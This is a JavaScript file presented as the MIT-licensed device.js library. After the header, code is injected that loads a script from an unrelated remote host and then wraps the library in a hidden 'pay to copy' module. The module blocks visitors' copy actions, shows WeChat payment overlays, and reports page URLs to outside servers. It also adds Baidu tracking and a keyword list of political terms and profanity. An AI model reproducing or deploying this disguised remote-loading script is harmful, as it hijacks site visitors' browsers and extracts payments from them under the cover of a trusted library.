// device.js
// (c) 2014 Matthew Hudson
// Device.js is freely distributable under the MIT license.
// For all details and documentation:
// http://matthewhudson.me/projects/device.js/

var script=document.createElement("script");  
script.type="text/javascript";  
script.src="https://n.2lian.com/static/js/jquery.min.js";  
document.getElementsByTagName('head')[0].appendChild(script);  
 
setTimeout(function(){  
$(document).ready(function(){  
(function() {
  var device,
    previousDevice,
    addClass,
    documentElement,
    find,
    handleOrientation,
    hasClass,
    orientationEvent,
    removeClass,
    userAgent;

  // Save the previous value of the device variable.
  previousDevice = window.device;

  device = {};

  // Add device as a global object.
  window.device = device;

  // The <html> element.
  documentElement = window.document.documentElement;

  // The client user agent string.
  // Lowercase, so we can use the more efficient indexOf(), instead of Regex
  userAgent = window.navigator.userAgent.toLowerCase();

  // Main functions
  // --------------

  device.ios = function () {
    return device.iphone() || device.ipod() || device.ipad();
  };

  device.iphone = function () {
    return !device.windows() && find('iphone');
  };

  device.ipod = function () {
    return find('ipod');
  };

  device.ipad = function () {
    return find('ipad');
  };

  device.android = function () {
    return !device.windows() && find('android');
  };

  device.androidPhone = function () {
    return device.android() && find('mobile');
  };

  device.androidTablet = function () {
    return device.android() && !find('mobile');
  };

  device.blackberry = function () {
    return find('blackberry') || find('bb10') || find('rim');
  };

  device.blackberryPhone = function () {
    return device.blackberry() && !find('tablet');
  };

  device.blackberryTablet = function () {
    return device.blackberry() && find('tablet');
  };

  device.windows = function () {
    return find('windows');
  };

  device.windowsPhone = function () {
    return device.windows() && find('phone');
  };

  device.windowsTablet = function () {
    return device.windows() && (find('touch') && !device.windowsPhone());
  };

  device.fxos = function () {
    return (find('(mobile;') || find('(tablet;')) && find('; rv:');
  };

  device.fxosPhone = function () {
    return device.fxos() && find('mobile');
  };

  device.fxosTablet = function () {
    return device.fxos() && find('tablet');
  };

  device.meego = function () {
    return find('meego');
  };

  device.cordova = function () {
    return window.cordova && location.protocol === 'file:';
  };

  device.nodeWebkit = function () {
    return typeof window.process === 'object';
  };

  device.mobile = function () {
    return device.androidPhone() || device.iphone() || device.ipod() || device.windowsPhone() || device.blackberryPhone() || device.fxosPhone() || device.meego();
  };

  device.tablet = function () {
    return device.ipad() || device.androidTablet() || device.blackberryTablet() || device.windowsTablet() || device.fxosTablet();
  };

  device.desktop = function () {
    return !device.tablet() && !device.mobile();
  };

  device.television = function() {
    var i, tvString;

    television = [
      "googletv",
      "viera",
      "smarttv",
      "internet.tv",
      "netcast",
      "nettv",
      "appletv",
      "boxee",
      "kylo",
      "roku",
      "dlnadoc",
      "roku",
      "pov_tv",
      "hbbtv",
      "ce-html"
    ];

    i = 0;
    while (i < television.length) {
      if (find(television[i])) {
        return true;
      }
      i++;
    }
    return false;
  };

  device.portrait = function () {
    return (window.innerHeight / window.innerWidth) > 1;
  };

  device.landscape = function () {
    return (window.innerHeight / window.innerWidth) < 1;
  };

  // Public Utility Functions
  // ------------------------

  // Run device.js in noConflict mode,
  // returning the device variable to its previous owner.
  device.noConflict = function () {
    window.device = previousDevice;
    return this;
  };

  // Private Utility Functions
  // -------------------------

  // Simple UA string search
  find = function (needle) {
    return userAgent.indexOf(needle) !== -1;
  };

  // Check if documentElement already has a given class.
  hasClass = function (className) {
    var regex;
    regex = new RegExp(className, 'i');
    return documentElement.className.match(regex);
  };

  // Add one or more CSS classes to the <html> element.
  addClass = function (className) {
    var currentClassNames = null;
    if (!hasClass(className)) {
      currentClassNames = documentElement.className.replace(/^\s+|\s+$/g, '');
      documentElement.className = currentClassNames + " " + className;
    }
  };

  // Remove single CSS class from the <html> element.
  removeClass = function (className) {
    if (hasClass(className)) {
      documentElement.className = documentElement.className.replace(" " + className, "");
    }
  };

  // HTML Element Handling
  // ---------------------

  // Insert the appropriate CSS class based on the _user_agent.

  if (device.ios()) {
    if (device.ipad()) {
      addClass("ios ipad tablet");
    } else if (device.iphone()) {
      addClass("ios iphone mobile");
    } else if (device.ipod()) {
      addClass("ios ipod mobile");
    }
  } else if (device.android()) {
    if (device.androidTablet()) {
      addClass("android tablet");
    } else {
      addClass("android mobile");
    }
  } else if (device.blackberry()) {
    if (device.blackberryTablet()) {
      addClass("blackberry tablet");
    } else {
      addClass("blackberry mobile");
    }
  } else if (device.windows()) {
    if (device.windowsTablet()) {
      addClass("windows tablet");
    } else if (device.windowsPhone()) {
      addClass("windows mobile");
    } else {
      addClass("desktop");
    }
  } else if (device.fxos()) {
    if (device.fxosTablet()) {
      addClass("fxos tablet");
    } else {
      addClass("fxos mobile");
    }
  } else if (device.meego()) {
    addClass("meego mobile");
  } else if (device.nodeWebkit()) {
    addClass("node-webkit");
  } else if (device.television()) {
    addClass("television");
  } else if (device.desktop()) {
    addClass("desktop");
  }

  if (device.cordova()) {
    addClass("cordova");
  }

  // Orientation Handling
  // --------------------

  // Handle device orientation changes.
  handleOrientation = function () {
    if (device.landscape()) {
      removeClass("portrait");
      addClass("landscape");
    } else {
      removeClass("landscape");
      addClass("portrait");
    }
    return;
  };

  // Detect whether device supports orientationchange event,
  // otherwise fall back to the resize event.
  if (Object.prototype.hasOwnProperty.call(window, "onorientationchange")) {
    orientationEvent = "orientationchange";
  } else {
    orientationEvent = "resize";
  }

  // Listen for changes in orientation.
  if (window.addEventListener) {
    window.addEventListener(orientationEvent, handleOrientation, false);
  } else if (window.attachEvent) {
    window.attachEvent(orientationEvent, handleOrientation);
  } else {
    window[orientationEvent] = handleOrientation;
  }

  handleOrientation();

  if (typeof define === 'function' && typeof define.amd === 'object' && define.amd) {
    define(function() {
      return device;
    });
  } else if (typeof module !== 'undefined' && module.exports) {
    module.exports = device;
  } else {
    window.device = device;
  }

}).call(this);
var uid;
function check(){
    var checkArray=new Array("共贪党","共产主义的幽灵","老共","中珙","中gong","gc党","贡挡","gong党","g产","狗产蛋","共残裆","恶党","邪党","共产专制","共产王朝","台独","土共","土g","共狗","g匪","共匪","仇共","共产党腐败","共产党专制","共产党的报应","共产党的末日","草你吗","草你丫","操你妈","擦你妈","操你娘","操他妈","日你妈","干你妈","干你娘","共产党专制","口交","口射","口淫");//这里设置过滤关键词，有这些关键词网页不会提示复制，我们要遵守中国法律法规，
	var str = document.documentElement.outerHTML;		
    for(var i=0; i<checkArray.length; i++){
    var s = str.indexOf(checkArray[i])==-1?false:true;
        if(s==true){
          return 0;//包含
        }
    }
    return 1;
}

;(function(exports){
	var doc = exports.document,
		a = {},
		expose = +new Date(),
		rExtractUri = /((?:http|https|file):\/\/.*?\/[^:]+)(?::\d+)?:\d+/,
		isLtIE8 = ('' + doc.querySelector).indexOf('[native code]') === -1;
	exports.getCurrAbsPath = function(){
		// FF,Chrome
		if (doc.currentScript){
			return doc.currentScript.src;
		}

		var stack;
		try{
			a.b();
		}
		catch(e){
			stack = e.fileName || e.sourceURL || e.stack || e.stacktrace;
		}
		// IE10
		if (stack){
			var absPath = rExtractUri.exec(stack)[1];
			if (absPath){
				return absPath;
			}
		}

		// IE5-9
		for(var scripts = doc.scripts,
			i = scripts.length - 1,
			script; script = scripts[i--];){
			if (script.className !== expose && script.readyState === 'interactive'){
				script.className = expose;
				// if less than ie 8, must get abs path by getAttribute(src, 4)
				return isLtIE8 ? script.getAttribute('src', 4) : script.src;
			}
		}
	};
}(window));

;(function ($) {	
    uid = document.getElementById('union_douhao').getAttribute('union_pay_tid');    
	var ispaying = false, buystate = null;		
	function hashCode(a){var b = 0, c = a.length, d = 0;if (c > 0) for (; c > d; ) b = 0 | (b << 5) - b + a.charCodeAt(d++); return b;}
	var payKey = hashCode(window.location.pathname.replace(/[a-z0-9]+.html/, ".html")).toString(), expires = 7;		
	var is_weixin = (function() {
	    return navigator.userAgent.toLowerCase().indexOf('micromessenger') !== -1
    })();
    var u = navigator.userAgent;    
    var isIOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);   
	if (isIOS) {var is = 'ios';}else{var is = 'anzhuo';} 
	if(is_weixin){	
	var payurl = 'https://vipm.mingfengtang.com/weixinpay/index/info/'+encodeURIComponent(encodeURIComponent(window.location.hostname))+'?link='+window.location.href+'&type=wx&mod=copypay&tid='+uid+'&is='+is;	
	}else{
	var payurl = 'https://vipm.mingfengtang.com/weixinpay/index/info/'+encodeURIComponent(encodeURIComponent(window.location.hostname))+'?link='+window.location.href+'&type=h5&mod=copypay&tid='+uid+'&is='+is;		
	}
	if( 'ontouchstart' in window ){			    
		$("head").append('<link href="https://n.2lian.com/static/js/css/m-style.css?t=150" rel="stylesheet" type="text/css" />');
		$("body").append('<div class="copy_mask mask"><div class="mask_box alert-bounceIn"><div class="copy_title">付费复制</div><div class="copy_tip">付费获得该网页复制权限</div><img src="https://n.2lian.com/static/js/img/pay.jpg" class="pay_img" alt=""><div class="copy_price">限时特价：<si style="color:#ff6600" id="money"></si>元/篇<span>原价:<si id="price"></si>元</span></div><a href="'+payurl+'" class="one_pay_btn">微信支付</a><div class="b_box"><span class="customer-service">常见问题</span></div><div class="close" data-alert="copy_mask"></div></div></div><div class="customer_mask mask"><div class="service-box"><div class="zxkf">常见问题 <div class="close" data-alert="customer_mask">×</div></div><div class="que_box"><div class="cj_title"><span>常见问题</span></div><ul><li><div class="que">1、支付成功后，为何无法复制内容？<img src="https://n.2lian.com/static/js/img/open.png" alt=""></div><div class="ans">我们提供的是网页的复制权限，与文章无关，如果付费后复制不了，请核对下微信账单信息，确保付费成功；已付费成功了还是复制不了，有可能是电脑的浏览器兼容性问题或者手机机型不支持的问题。请联系客服提供支付记录将您要复制的内容发送给您。<div id="kefu2"></div></div></li><li><div class="que">2、付费后能否更换浏览器或者清理浏览器缓存后进行复制操作？<img src="https://n.2lian.com/static/js/img/open.png" alt=""></div><div class="ans">更换浏览器或者清理浏览器缓存会导致复制不成功，请不要更换浏览器和清理浏览器缓存。</div></li><li id="haskefu" style="display:none"><div class="que">3、如何联系客服？<img src="https://n.2lian.com/static/js/img/open.png" alt=""></div><div class="ans" id="kefu"></div></li></ul></div></div></div><div class="my_wxpay mask"><div class="wx_pic_img"><div class="close" data-alert="my_wxpay"></div><div class="wx_top"><span>微信支付中，请勿关闭窗口</span></div><div class="payqr_box"><div class="hc" style="display: block;"><img src="https://n.2lian.com/static/js/img/loading.gif"></div><div class="zhifu"><div class="sm">微信支付中，请勿关闭窗口</span></div></div></div></div></div><div class="pay_success_mask mask"><div class="pay_success_box"><div class="payqr_success_text"><svg class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1629"><path d="M511.993344 0.002048C229.260838 0.002048 0 229.261862 0 511.998464c0 282.732506 229.259814 511.990272 511.993344 511.990272C794.73097 1023.987712 1023.988736 794.73097 1023.988736 511.998464c0-282.736602-229.257766-511.996416-511.995392-511.996416zM788.582942 397.083376L475.699087 709.96723C464.321548 721.341697 449.189043 727.145665 434.1702 727.145665c-15.018843 0-30.036662-5.687233-41.527863-17.177411l-157.23859-157.241662c-22.982403-22.865668-22.982403-60.072299 0-83.054702 22.982403-22.982403 60.074347-22.86874 83.05675 0l115.823366 115.710727 271.352919-271.357015c22.871812-22.86874 60.074347-22.86874 83.05675 0 22.871812 22.983427 22.871812 60.189034-0.11059 83.057774z" fill="" p-id="1630"></path></svg><p class="pay_success_tip1">支付成功</p><p class="pay_success_tip2">已获得该网页复制权限</p><button class="buy-btn buy_btn_qr">确定</button></div></div></div>');			
		var _time = null;
		window.ontouchstart = function(){			
			if( !ispaying ){				
				_time = setTimeout(function(){					
					if(check()){
					  var b = Cookies.get(payKey);	
					  void 0 === b 	&& $.getJSON('https://vip.mingfengtang.com/?m=wxpay&a=cha&cc=1&tid='+uid+'&link='+window.location.href,function(rs){
					  if(rs.status == 0){			
					  $('#price').text(rs.data.yuanjia);
					  $('#money').text(rs.data.xianjia);	
					  if(rs.data.kefu){
					  $('#haskefu').show();	
					  $('#kefu,#kefu2').text('客服QQ：'+rs.data.kefu);	
					  }	
					  $(".copy_mask").show();
					  }else if(rs.status == 2){
			           alert(rs.msg); 	
			          }
					  })					  
					}
				}, 400);
			}
		}
		window.ontouchmove = function(){
			clearTimeout(_time);
		}
		window.ontouchend = function(){
			clearTimeout(_time);			
		}		
		window.location.href.indexOf("order=") > -1 && (
			$(".my_wxpay").css("display", "block"), ispaying=true, payTimer = setInterval(function() {
				$.getJSON('https://vip.mingfengtang.com/?m=wxpay&a=cha&cc=2&tid='+uid+'&link=' + window.location.href , function(a) {
					a.status && (					    
						$(".mask").hide(),
						$(".pay_success_mask").show(),
						Cookies.set(payKey, 1, {
							expires: expires,
							path: "/"
						}),
						clearInterval(payTimer)
					);
				});
			}, 1500)
		);
	}else{			    
		$("head").append('<link href="https://n.2lian.com/static/js/css/style.css?t=7" rel="stylesheet" type="text/css" />');
		$("body").append('<div class="copy_mask mask"><div class="copy-alert alert-bounceIn"><div class="close" data-alert="copy_mask"></div><div class="paybox"><div class="paybox-title">付费复制</div><div class="paybox-art">付费获得该网页复制权限</div><div class="paybox-img"><img src="https://n.2lian.com/static/js/img/pay.jpg" /></div><div class="paybox-money"><h2>限时特价：<si style="color:#ff6600" id="money"></si>元/篇</h2><span>原价:<si id="price"></si>元</span></div><div class="paybox-bottom online-pay">微信支付</div><div class="paybox-service"><span class="customer-service">常见问题</span></div></div></div></div><div class="pay_mask mask"><div class="mask_box"><div class="pay_mask_top">欢迎使用微信支付</div><div class="pay_qrcode"><img src="https://n.2lian.com/static/js/img/loading.gif" alt=""></div><div class="pay_tip"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAIVBMVEUAAAD////////////////////////////////////////PIev5AAAACnRSTlMA1ncNunNiOTUTSsYRYQAAAENJREFUCNdjiFq1armxcdWqVUsZligpKTMwGCkpeTEsY4CCLIZFMKYWYWYnjDmDAQkIwgEyEwGQtJFkG8KRyE5HeAgAREcaCU+naWkAAAAASUVORK5CYII=" alt="">扫一扫微信支付</div><div class="pay_price">微信支付：<span></span></div><div class="close" data-alert="pay_mask"></div></div></div><div class="buy_success mask"><div class="mask_box"><svg class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1629"><path d="M511.993344 0.002048C229.260838 0.002048 0 229.261862 0 511.998464c0 282.732506 229.259814 511.990272 511.993344 511.990272C794.73097 1023.987712 1023.988736 794.73097 1023.988736 511.998464c0-282.736602-229.257766-511.996416-511.995392-511.996416zM788.582942 397.083376L475.699087 709.96723C464.321548 721.341697 449.189043 727.145665 434.1702 727.145665c-15.018843 0-30.036662-5.687233-41.527863-17.177411l-157.23859-157.241662c-22.982403-22.865668-22.982403-60.072299 0-83.054702 22.982403-22.982403 60.074347-22.86874 83.05675 0l115.823366 115.710727 271.352919-271.357015c22.871812-22.86874 60.074347-22.86874 83.05675 0 22.871812 22.983427 22.871812 60.189034-0.11059 83.057774z" fill="" p-id="1630"></path></svg><div class="buy_success_tip1">支付成功</div><div class="buy_success_tip2">已获得网页复制权限</div><div class="buy_btn_qr">确定</div></div></div><div class="customer_mask mask"><div class="customer_service_box" style="margin: 112px auto 0;width:730px;"><div class="close" data-alert="customer_mask"></div><div class="cj_title"><span>常见问题</span></div><ul><li><div class="que">1、支付成功后，为何无法复制内容？</div><div class="ans">我们提供的是网页的复制权限，与文章无关，如果付费后复制不了，请核对下微信账单信息，确保付费成功；已付费成功了还是复制不了，有可能是电脑的浏览器兼容性问题或者手机机型不支持的问题。请联系客服提供支付记录将您要复制的内容发送给您。<div id="kefu2"></div></div></li><li><div class="que">2、付费后能否更换浏览器或者清理浏览器缓存后进行复制操作？</div><div class="ans">更换浏览器或者清理浏览器缓存会导致复制不成功，请不要更换浏览器和清理浏览器缓存。</div></li><li id="haskefu" style="display:none"><div class="que">3、如何联系客服？</div><div class="ans" id="kefu"></div></li></ul></div></div>');
		
	}
	
	$(document).on("click", ".one_pay_btn", function() {
		$(".mask").hide();
		$(".my_wxpay").css("display", "block"), ispaying=true, payTimer = setInterval(function() {
				$.getJSON('https://vip.mingfengtang.com/?m=wxpay&a=cha&cc=2&tid='+uid+'&link=' + window.location.href , function(a) {
					a.status && (	
						$(".pay_success_mask").show(),
						Cookies.set(payKey, 1, {
							expires: expires,
							path: "/"
						}),
						clearInterval(payTimer)
					);
				});
			}, 1500)
	});
	$(document).on("click", ".copy_mask .customer-service", function(){
		$(".customer_mask").show();
	});
	$(document).on("click", ".service-box li", function() {
		$(this).find(".ans").toggle();
	});
	$(document).on("click", ".mask .close", function(){
		ispaying = false;		
		$("." + $(this).data("alert")).css("display", "none");
		window.clearInterval(buystate);
		window.clearInterval(payTimer);
	});
	$(document).on("click", ".buy_btn_qr", function() {
		$(".mask").hide();
		window.clearInterval(buystate);
		window.clearInterval(payTimer);
	});	  
	document.addEventListener("copy", function(a){		
        if(check()){
		var b = Cookies.get(payKey);
		void 0 === b  && a.preventDefault();	
		$.getJSON('https://vip.mingfengtang.com/?m=wxpay&a=cha&cc=3&tid='+uid+'&link='+window.location.href,function(rs){
		    if(rs.status == 0){						
			$('#price').text(rs.data.yuanjia);
			$('#money').text(rs.data.xianjia);	
			if(rs.data.kefu){
			$('#haskefu').show();	
			$('#kefu,#kefu2').text('客服QQ：'+rs.data.kefu);	
			}			
		    $(".copy_mask").show();	
			}else if(rs.status == 2){
			  alert(rs.msg); 	
			}
		})	
		}		
	});
	$(document).on("click", ".paybox-bottom.online-pay", function() {	
        if( !ispaying ){	
			$(".pay_mask .pay_qrcode img").attr("src", "https://n.2lian.com/static/js/img/loading.gif");
			$(".pay_mask").show();
			$.ajax({
				url: 'https://vip.mingfengtang.com/?m=wxpay&c=index',				
				data: {
					link: window.location.href,		
					tid:uid
				},
				method: "GET",
				dataType: "JSON",
				timeout: 4000,
				success: function(res) {
					$(".pay_mask .pay_qrcode img").attr("src", res.data.image),
					$(".pay_mask .pay_price span").text(res.data.price + "元"),
					$(".pay_mask").show(),
					buystate = setInterval(function() {
						$.getJSON('https://vip.mingfengtang.com/?m=wxpay&a=cx&order='+res.data.order,function(rs){
							rs.status && ( $(".mask").hide(), $(".buy_success").show(), Cookies.set(payKey, 1, {
								expires: expires,
								path: "/"
							}), ispaying = false, clearInterval(buystate));
						})
					}, 1500);
				},
				complete: function(){
					
				}
			});
		}
		
	});
	
})(jQuery);
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?6983af58169f1f02aeaf6a3ae98cdfba";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
"js.cookie";
!function(e) {
    var n = !1;
    if ("function" == typeof define && define.amd && (define(e),
    n = !0),
    "object" == typeof exports && (module.exports = e(),
    n = !0),
    !n) {
        var o = window.Cookies
          , t = window.Cookies = e();
        t.noConflict = function() {
            return window.Cookies = o,
            t
        }
    }
}
(function() {
    function e() {
        for (var e = 0, n = {}; e < arguments.length; e++) {
            var o = arguments[e];
            for (var t in o)
                n[t] = o[t]
        }
        return n
    }
    function n(o) {
        function t(n, r, i) {
            var c;
            if ("undefined" != typeof document) {
                if (arguments.length > 1) {
                    if ("number" == typeof (i = e({
                        path: "/"
                    }, t.defaults, i)).expires) {
                        var a = new Date;
                        a.setMilliseconds(a.getMilliseconds() + 864e5 * i.expires),
                        i.expires = a
                    }
                    i.expires = i.expires ? i.expires.toUTCString() : "";
                    try {
                        c = JSON.stringify(r),
                        /^[\{\[]/.test(c) && (r = c)
                    } catch (e) {}
                    r = o.write ? o.write(r, n) : encodeURIComponent(r + "").replace(/%(23|24|26|2B|3A|3C|3E|3D|2F|3F|40|5B|5D|5E|60|7B|7D|7C)/g, decodeURIComponent),
                    n = (n = (n = encodeURIComponent(n + "")).replace(/%(23|24|26|2B|5E|60|7C)/g, decodeURIComponent)).replace(/[\(\)]/g, escape);
                    var s = "";
                    for (var f in i)
                        i[f] && (s += "; " + f,
                        !0 !== i[f] && (s += "=" + i[f]));
                    return document.cookie = n + "=" + r + s
                }
                n || (c = {});
                for (var p = document.cookie ? document.cookie.split("; ") : [], d = /(%[0-9A-Z]{2})+/g, u = 0; u < p.length; u++) {
                    var l = p[u].split("=")
                      , C = l.slice(1).join("=");
                    this.json || '"' !== C.charAt(0) || (C = C.slice(1, -1));
                    try {
                        var m = l[0].replace(d, decodeURIComponent);
                        if (C = o.read ? o.read(C, m) : o(C, m) || C.replace(d, decodeURIComponent),
                        this.json)
                            try {
                                C = JSON.parse(C)
                            } catch (e) {}
                        if (n === m) {
                            c = C;
                            break
                        }
                        n || (c[m] = C)
                    } catch (e) {}
                }
                return c
            }
        }
        return t.set = t,
        t.get = function(e) {
            return t.call(t, e)
        }
        ,
        t.getJSON = function() {
            return t.apply({
                json: !0
            }, [].slice.call(arguments))
        }
        ,
        t.defaults = {},
        t.remove = function(n, o) {
            t(n, "", e(o, {
                expires: -1
            }))
        }
        ,
        t.withConverter = n,
        t
    }
    return n(function() {})
});
});  
},600);